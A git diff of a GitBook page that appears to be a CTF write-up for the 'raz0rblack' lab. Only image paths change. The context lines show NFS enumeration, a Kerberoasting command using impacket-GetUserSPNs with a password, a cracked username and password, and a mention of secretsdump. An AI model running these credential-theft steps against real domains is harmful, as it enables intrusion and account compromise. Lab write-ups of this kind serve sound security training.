@@ -8,7 +8,7 @@
 
 {% embed url="https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/pentest_notes#port-111-rpcbind" %}
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 showmount -e 10.10.241.105
@@ -50,7 +50,7 @@ impacket-GetUserSPNs raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.10.35.193 
 
 xyan1d3:cyanide9amine5628
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 i found a local domain user made secretsdump
 
